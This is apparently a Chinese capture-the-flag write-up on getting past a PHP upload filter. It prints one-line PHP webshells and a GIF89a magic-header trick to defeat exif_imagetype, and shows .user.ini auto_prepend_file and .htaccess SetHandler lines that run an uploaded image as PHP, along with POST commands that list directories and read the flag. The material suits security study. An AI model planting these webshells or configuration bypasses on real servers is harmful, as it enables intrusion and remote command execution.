@[toc]

##  前言

由这个题和MRCTF中的`我传你吗`这两个题总结`.htaccess`和`.user.ini`绕过文件上传

##  wp

首先这个题就是用`.user.ini`或者`.htaccess`来绕过

我们传png文件，看到exif_imagetype:not image!

```
exif_imagetype，就是用来检查图像类型的
```

必须要gif文件，但是我们在文件内容上加个魔法头GIF89a,就可以绕过

我们用后缀为`.user.ini`或者`.htaccess`，发现只要加个魔法头都可以传进去

本来是直接用

```php
<?php
    eval($_post[1]);   
?>
```

但是不行，返回contents有问题，说明对文件内容进行了过滤

我手工FUZZ了一下，`<?`被过滤了，其他都应该没有

然后换了个[一句话木马](https://blog.csdn.net/weixin_39190897/article/details/86772765)

```
<script language='php'>eval($_POST[1]);</script>
```

我们可以传1.png文件进去，文件内容

```
GIF89a
一句话木马
```

再传.user.ini文件

```
文件内容
auto_prepend_file=/var/www/html/upload/....(路径)
auto_append_file=/var/www/html/upload/....(路径)
```

然后用蚁剑连接或者直接访问url，用命令执行

```
POST:1=var_dump(scandir("/"));找路径
然后1=var_dump(system("cat /f*"));
```

如果是.htaccess

只需要把文件内容改一下

```
SetHandler application/x-httpd-php,把全部文件都指定为php文件执行。
```

##  .user.ini绕过

[.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)

##  .htaccess绕过

[[CTF\].htaccess的使用技巧总结_Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/116666720)
